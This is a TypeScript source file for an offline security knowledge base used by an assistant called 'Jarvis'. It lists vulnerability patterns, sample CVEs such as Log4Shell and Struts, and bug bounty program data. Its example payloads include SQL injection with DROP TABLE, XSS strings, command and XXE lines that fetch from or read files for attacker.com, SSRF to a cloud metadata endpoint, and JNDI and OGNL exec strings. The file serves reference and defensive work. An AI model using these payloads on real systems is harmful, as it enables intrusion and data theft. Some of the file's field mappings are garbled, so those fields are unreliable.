/**
 * SECURITY KNOWLEDGE BASE
 *
 * Pre-loaded knowledge about security concepts, vulnerabilities, CVEs, and exploitation techniques.
 * This enables Jarvis to answer security questions WITHOUT making API calls.
 *
 * ✨ PHASE 3b: Offline Q&A System - No external dependencies needed
 */

export interface CVEEntry {
  id: string;
  cvss: number;
  description: string;
  affected_software: string[];
  affected_versions: string[];
  exploitation_difficulty: 'trivial' | 'low' | 'moderate' | 'high' | 'very-high';
  impact: string;
  mitigation: string;
  payload_examples?: string[];
}

export interface VulnerabilityPattern {
  type: string;
  description: string;
  examples: string[];
  detection_methods: string[];
  remediation: string;
  references: string[];
  severity: 'critical' | 'high' | 'medium' | 'low';
}

export interface HackerOneProgram {
  id: string;
  name: string;
  description: string;
  bounty_range: [number, number]; // [min, max] in USD
  scope: string[];
  accepted_vulnerabilities: string[];
  response_target_days: number;
}

export class SecurityKnowledgeBase {
  private cves: Map<string, CVEEntry>;
  private vulnerabilities: Map<string, VulnerabilityPattern>;
  private programs: Map<string, HackerOneProgram>;
  private keywords: Map<string, string[]>; // keyword -> relevant topics

  constructor() {
    this.cves = new Map();
    this.vulnerabilities = new Map();
    this.programs = new Map();
    this.keywords = new Map();

    this.initializeKnowledge();
  }

  private initializeKnowledge(): void {
    // ============================================
    // VULNERABILITY PATTERNS
    // ============================================

    this.vulnerabilities.set('sql-injection', {
      type: 'SQL Injection',
      description: 'An attacker injects SQL code into input fields, allowing unauthorized database access, data theft, or deletion.',
      examples: [
        "' OR '1'='1",
        "admin'--",
        "1 UNION SELECT NULL, NULL, NULL--",
        "'; DROP TABLE users;--"
      ],
      detection_methods: [
        'Input validation testing',
        'WAF analysis',
        'Blind SQL injection timing',
        'Error-based SQL injection attempts'
      ],
      remediation: 'Use prepared statements/parameterized queries, input validation, least privilege database accounts',
      references: [
        'OWASP Top 10 - A03:2021 Injection',
        'CWE-89: Improper Neutralization of Special Elements used in an SQL Command',
        'CAPEC-66: SQL Injection'
      ],
      severity: 'critical'
    });

    this.vulnerabilities.set('xss', {
      type: 'Cross-Site Scripting (XSS)',
      description: 'Malicious scripts are injected into web pages, executing in victims\' browsers to steal data or hijack sessions.',
      examples: [
        '<script>alert("XSS")</script>',
        '<img src=x onerror="alert(1)">',
        '<svg onload="alert(1)">',
        'javascript:alert(1)'
      ],
      detection_methods: [
        'Input/output encoding testing',
        'DOM-based analysis',
        'Reflected vs Stored XSS testing',
        'Browser console monitoring'
      ],
      remediation: 'Output encoding, Content Security Policy, input validation, HTTPOnly cookies',
      references: [
        'OWASP Top 10 - A03:2021 Injection',
        'CWE-79: Improper Neutralization of Input During Web Page Generation',
        'CAPEC-18: XSS Attacks'
      ],
      severity: 'high'
    });

    this.vulnerabilities.set('csrf', {
      type: 'Cross-Site Request Forgery (CSRF)',
      description: 'Attacker tricks a user into performing unwanted actions on a web application where they are authenticated.',
      examples: [
        '<img src="https://bank.com/transfer?to=attacker&amount=1000">',
        '<form action="https://bank.com/transfer" method="POST">...</form>',
        'Fetch request from attacker\'s site to victim\'s site'
      ],
      detection_methods: [
        'Token validation testing',
        'SameSite cookie verification',
        'Referer header analysis',
        'Origin header checks'
      ],
      remediation: 'CSRF tokens, SameSite cookies, Referer header validation, custom request headers',
      references: [
        'OWASP Top 10 - A01:2021 BROKEN Access Control',
        'CWE-352: Cross-Site Request Forgery (CSRF)',
        'CAPEC-62: Cross-Site Request Forgery'
      ],
      severity: 'high'
    });

    this.vulnerabilities.set('command-injection', {
      type: 'Command Injection',
      description: 'Attacker injects OS commands through application input, gaining command execution on the server.',
      examples: [
        '; whoami',
        '| id',
        '`cat /etc/passwd`',
        '$(wget http://attacker.com/shell.sh)'
      ],
      detection_methods: [
        'Input validation testing with metacharacters',
        'Time-based command execution',
        'Out-of-band data exfiltration',
        'Error message analysis'
      ],
      remediation: 'Avoid shell commands, use APIs, input validation, principle of least privilege',
      references: [
        'OWASP Top 10 - A03:2021 Injection',
        'CWE-78: Improper Neutralization of Special Elements used in an OS Command',
        'CAPEC-88: OS Command Injection'
      ],
      severity: 'critical'
    });

    this.vulnerabilities.set('rce', {
      type: 'Remote Code Execution (RCE)',
      description: 'Attacker executes arbitrary code on the target system, typically through vulnerabilities in application logic or deserialization.',
      examples: [
        'Unsafe deserialization of untrusted data',
        'Code injection in template engines',
        'Expression language (EL) injection',
        'Pickle deserialization in Python'
      ],
      detection_methods: [
        'Source code review for dangerous functions',
        'Dynamic testing with payloads',
        'Serialization analysis',
        'Gadget chain identification'
      ],
      remediation: 'Never deserialize untrusted data, use safe serialization formats, disable dangerous features',
      references: [
        'OWASP Top 10 - A08:2021 Software and Data Integrity Failures',
        'CWE-94: Improper Control of Generation of Code',
        'CWE-502: Deserialization of Untrusted Data'
      ],
      severity: 'critical'
    });

    this.vulnerabilities.set('lfi', {
      type: 'Local File Inclusion (LFI)',
      description: 'Attacker includes local files on the web server, leading to information disclosure or code execution.',
      examples: [
        'file=../../../../etc/passwd',
        'page=../../web.config',
        'include=/proc/self/environ',
        'path=../../../../windows/win.ini'
      ],
      detection_methods: [
        'Path traversal testing',
        'Null byte injection',
        'Log poisoning testing',
        'Wrapper protocol abuse'
      ],
      remediation: 'Whitelist allowed files, avoid user input in file operations, disable dangerous PHP wrappers',
      references: [
        'OWASP - Path Traversal',
        'CWE-22: Improper Limitation of a Pathname to a Restricted Directory',
        'CAPEC-126: Path Traversal'
      ],
      severity: 'high'
    });

    this.vulnerabilities.set('xxe', {
      type: 'XML External Entity Injection (XXE)',
      description: 'Attacker injects malicious XML entities to read files, perform SSRF, or cause DoS.',
      examples: [
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>',
        '<!ENTITY xxe SYSTEM "expect://id">',
        '<!ENTITY % param1 SYSTEM "file:///etc/passwd">',
        '<!ENTITY xxe SYSTEM "http://attacker.com/shell.sh">'
      ],
      detection_methods: [
        'XML parsing testing',
        'Out-of-band data extraction',
        'DTD analysis',
        'Blind XXE detection'
      ],
      remediation: 'Disable DTD processing, disable XML external entities, use safe XML libraries',
      references: [
        'OWASP Top 10 - A05:2021 XML External Entities (XXE)',
        'CWE-611: Improper Restriction of XML External Entity Reference',
        'CAPEC-197: XXE Injection'
      ],
      severity: 'high'
    });

    this.vulnerabilities.set('ssrf', {
      type: 'Server-Side Request Forgery (SSRF)',
      description: 'Attacker forces the server to make requests to internal systems or external targets, bypassing firewalls.',
      examples: [
        'http://localhost:8080/admin',
        'http://169.254.169.254/latest/meta-data/',
        'http://internal-db.local:3306/',
        'file:///etc/passwd'
      ],
      detection_methods: [
        'URL input testing',
        'Metadata service enumeration',
        'Internal network scanning',
        'Time-based SSRF'
      ],
      remediation: 'Whitelist allowed URLs, validate domains, disable dangerous protocols, network segmentation',
      references: [
        'OWASP - SSRF',
        'CWE-918: Server-Side Request Forgery (SSRF)',
        'CAPEC-588: SSRF'
      ],
      severity: 'high'
    });

    this.vulnerabilities.set('authentication-bypass', {
      type: 'Authentication Bypass',
      description: 'Attacker gains unauthorized access by circumventing authentication mechanisms without valid credentials.',
      examples: [
        'Weak password reset mechanisms',
        'Session fixation attacks',
        'Timing attacks on authentication',
        'Logic flaws in access control'
      ],
      detection_methods: [
        'Authentication flow analysis',
        'Token validation testing',
        'Credential enumeration',
        'Session management review'
      ],
      remediation: 'Strong authentication, MFA, secure session management, account lockout policies',
      references: [
        'OWASP Top 10 - A01:2021 BROKEN Access Control',
        'CWE-287: Improper Authentication'
      ],
      severity: 'critical'
    });

    this.vulnerabilities.set('privilege-escalation', {
      type: 'Privilege Escalation',
      description: 'Attacker increases their privileges to access restricted functionality or data.',
      examples: [
        'Modifying user role in request parameters',
        'API endpoint accessible without authorization',
        'OS privilege escalation via sudo misconfiguration',
        'File permission misconfiguration'
      ],
      detection_methods: [
        'Parameter tampering',
        'API permission testing',
        'Capability analysis',
        'File permission audits'
      ],
      remediation: 'Proper access control, API authorization checks, principle of least privilege',
      references: [
        'OWASP Top 10 - A01:2021 BROKEN Access Control',
        'CWE-269: Improper Access Control (Generic)'
      ],
      severity: 'high'
    });

    // ============================================
    // SAMPLE CVEs
    // ============================================

    this.cves.set('CVE-2021-44228', {
      id: 'CVE-2021-44228',
      cvss: 10.0,
      description: 'Apache Log4j2 JNDI features do not protect against attacker controlled LDAP and other JNDI related endpoints.',
      affected_software: ['Apache Log4j2'],
      affected_versions: ['2.0-beta9 to 2.15.0'],
      exploitation_difficulty: 'trivial',
      impact: 'Remote Code Execution, Complete system compromise',
      mitigation: 'Upgrade to Log4j 2.16.0 or later, disable JNDI features, set log4j2.formatMsgNoLookups=true',
      payload_examples: [
        '${jndi:ldap://attacker.com/a}',
        '${jndi:rmi://attacker.com/a}',
        '${jndi:dns://attacker.com/a}'
      ]
    });

    this.cves.set('CVE-2017-5638', {
      id: 'CVE-2017-5638',
      cvss: 10.0,
      description: 'Apache Struts 2 REST plugin performs incomplete input validation on the URL.',
      affected_software: ['Apache Struts 2'],
      affected_versions: ['2.3.5 to 2.3.31', '2.5 to 2.5.10'],
      exploitation_difficulty: 'trivial',
      impact: 'Remote Code Execution via OGNL expression injection',
      mitigation: 'Upgrade to Struts 2.3.32 or later, disable REST plugin if not needed',
      payload_examples: [
        '%{(#cmd=\'id\').(@java.lang.Runtime@getRuntime().exec(#cmd))}',
        '%{(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)}'
      ]
    });

    this.cves.set('CVE-2018-8999', {
      id: 'CVE-2018-8999',
      cvss: 9.8,
      description: 'Adobe ColdFusion allows Remote Code Execution through arbitrary file upload.',
      affected_software: ['Adobe ColdFusion'],
      affected_versions: ['10', '11', '2016', '2018'],
      exploitation_difficulty: 'low',
      impact: 'Remote Code Execution, Server Compromise',
      mitigation: 'Apply Adobe security patches, restrict file upload locations',
      payload_examples: [
        'Upload CFM file to server',
        'Access via /crossdomain.xml'
      ]
    });

    // ============================================
    // HACKERONE PROGRAMS
    // ============================================

    this.programs.set('google', {
      id: 'google',
      name: 'Google Vulnerability Reward Program',
      description: 'Google\'s bug bounty program covering all Google services.',
      bounty_range: [100, 50000],
      scope: [
        'https://google.com',
        'https://accounts.google.com',
        'https://accounts.google.com/',
        'Google APIs'
      ],
      accepted_vulnerabilities: [
        'Remote Code Execution',
        'Authentication Bypass',
        'Privilege Escalation',
        'XSS',
        'CSRF'
      ],
      response_target_days: 90
    });

    this.programs.set('microsoft', {
      id: 'microsoft',
      name: 'Microsoft Bug Bounty Program',
      description: 'Microsoft\'s coordinated vulnerability disclosure program.',
      bounty_range: [500, 250000],
      scope: [
        'microsoft.com',
        'windows.com',
        'azure.com',
        'office.com'
      ],
      accepted_vulnerabilities: [
        'Remote Code Execution',
        'Information Disclosure',
        'Elevation of Privilege'
      ],
      response_target_days: 90
    });

    this.programs.set('facebook', {
      id: 'facebook',
      name: 'Facebook Whitehat Program',
      description: 'Facebook\'s vulnerability disclosure program.',
      bounty_range: [0, 40000],
      scope: [
        'facebook.com',
        'instagram.com',
        'whatsapp.com'
      ],
      accepted_vulnerabilities: [
        'Information Disclosure',
        'Authentication Issues',
        'XSS',
        'CSRF'
      ],
      response_target_days: 90
    });

    // ============================================
    // KEYWORD MAPPING
    // ============================================

    this.keywords.set('sql', ['sql-injection', 'database', 'query']);
    this.keywords.set('injection', ['sql-injection', 'command-injection', 'xxe']);
    this.keywords.set('cross-site', ['xss', 'csrf']);
    this.keywords.set('authentication', ['authentication-bypass', 'privilege-escalation']);
    this.keywords.set('code', ['rce', 'command-injection']);
    this.keywords.set('file', ['lfi', 'xxe', 'path-traversal']);
    this.keywords.set('request', ['ssrf', 'csrf']);
    this.keywords.set('cvss', ['severity', 'critical', 'high']);
  }

  /**
   * Search for CVE by ID or keyword
   */
  searchCVEs(query: string): CVEEntry[] {
    query = query.toLowerCase();
    const results: CVEEntry[] = [];

    for (const [id, cve] of this.cves.entries()) {
      if (id.toLowerCase().includes(query) ||
          cve.description.toLowerCase().includes(query) ||
          cve.affected_software.some(s => s.toLowerCase().includes(query))) {
        results.push(cve);
      }
    }

    return results;
  }

  /**
   * Get vulnerability pattern by type
   */
  getVulnerability(type: string): VulnerabilityPattern | undefined {
    return this.vulnerabilities.get(type.toLowerCase());
  }

  /**
   * Search vulnerabilities
   */
  searchVulnerabilities(query: string): VulnerabilityPattern[] {
    query = query.toLowerCase();
    const results: VulnerabilityPattern[] = [];

    for (const [key, vuln] of this.vulnerabilities.entries()) {
      if (key.includes(query) ||
          vuln.type.toLowerCase().includes(query) ||
          vuln.description.toLowerCase().includes(query)) {
        results.push(vuln);
      }
    }

    return results;
  }

  /**
   * Get related topics for a keyword
   */
  getRelatedTopics(keyword: string): string[] {
    return this.keywords.get(keyword.toLowerCase()) || [];
  }

  /**
   * Get applicable HackerOne programs for a vulnerability type
   */
  getApplicablePrograms(vulnerability_type: string): HackerOneProgram[] {
    const results: HackerOneProgram[] = [];

    for (const [id, program] of this.programs.entries()) {
      if (program.accepted_vulnerabilities.some(v =>
        v.toLowerCase().includes(vulnerability_type.toLowerCase()))) {
        results.push(program);
      }
    }

    return results;
  }

  /**
   * Get all known vulnerability types
   */
  getAllVulnerabilityTypes(): string[] {
    return Array.from(this.vulnerabilities.keys());
  }

  /**
   * Get statistics about knowledge base
   */
  getStats(): { cves: number; vulnerabilities: number; programs: number } {
    return {
      cves: this.cves.size,
      vulnerabilities: this.vulnerabilities.size,
      programs: this.programs.size
    };
  }

  /**
   * PHASE 3C: Load extended HackerOne data from JSON files
   */
  loadHackerOneData(): void {
    try {
      const fs = require('fs');
      const path = require('path');

      const dataPath = path.join(__dirname, 'data');

      // Load extended CVE database
      const cveDbPath = path.join(dataPath, 'cve-database.json');
      if (fs.existsSync(cveDbPath)) {
        const cveData = JSON.parse(fs.readFileSync(cveDbPath, 'utf-8'));
        (cveData.cves || []).forEach((cve: any) => {
          if (!this.cves.has(cve.id)) {
            this.cves.set(cve.id, {
              id: cve.id,
              cvss: cve.cvss_score,
              description: cve.description,
              affected_software: cve.affected_software,
              affected_versions: cve.affected_software,
              exploitation_difficulty: cve.exploitation_difficulty as any,
              impact: cve.vulnerability_type,
              mitigation: cve.exploitation_steps?.join('; ') || '',
              payload_examples: cve.payloads
            });
          }
        });
        console.log(`✅ Loaded ${cveData.cves?.length || 0} additional CVEs from HackerOne database`);
      }

      // Load extended programs from hackerone-programs.json
      const programsPath = path.join(dataPath, 'hackerone-programs.json');
      if (fs.existsSync(programsPath)) {
        const programsData = JSON.parse(fs.readFileSync(programsPath, 'utf-8'));
        (programsData.programs || []).forEach((program: any) => {
          if (!this.programs.has(program.program_id)) {
            this.programs.set(program.program_id, {
              id: program.program_id,
              name: program.name,
              description: program.specialization || '',
              bounty_range: [program.bounty_range?.min || 0, program.bounty_range?.max || 0],
              scope: program.scope?.domains || [],
              accepted_vulnerabilities: program.accepts_vulnerability_types || [],
              response_target_days: program.response_target_time ? parseInt(program.response_target_time) : 30
            });
          }
        });
        console.log(`✅ Loaded ${programsData.programs?.length || 0} HackerOne programs`);
      }
    } catch (error) {
      console.warn('⚠️ Could not load extended HackerOne data:', error);
    }
  }

  /**
   * Search HackerOne programs by bounty amount
   */
  searchProgramsByBounty(minBounty: number, maxBounty: number = Infinity): HackerOneProgram[] {
    const results: HackerOneProgram[] = [];
    for (const [id, program] of this.programs.entries()) {
      const programMax = program.bounty_range[1];
      const programMin = program.bounty_range[0];
      if (programMin >= minBounty && programMax <= maxBounty) {
        results.push(program);
      }
    }
    return results;
  }

  /**
   * Get top programs by average bounty
   */
  getTopPrograms(limit: number = 5): HackerOneProgram[] {
    return Array.from(this.programs.values())
      .sort((a, b) => b.bounty_range[1] - a.bounty_range[1])
      .slice(0, limit);
  }

  /**
   * Search CVEs by severity
   */
  searchCVEsBySeverity(severity: 'critical' | 'high' | 'medium' | 'low'): CVEEntry[] {
    const severityScore: { [key: string]: number } = {
      critical: 9.0,
      high: 7.0,
      medium: 4.0,
      low: 0.1
    };

    const threshold = severityScore[severity];
    const nextThreshold = severity === 'critical' ? 10 : severity === 'high' ? 8.9 : severity === 'medium' ? 6.9 : 3.9;

    const results: CVEEntry[] = [];
    for (const [id, cve] of this.cves.entries()) {
      if (cve.cvss >= threshold && cve.cvss <= nextThreshold) {
        results.push(cve);
      }
    }
    return results;
  }
}

export const securityKnowledgeBase = new SecurityKnowledgeBase();

// Initialize HackerOne data after singleton creation
securityKnowledgeBase.loadHackerOneData();
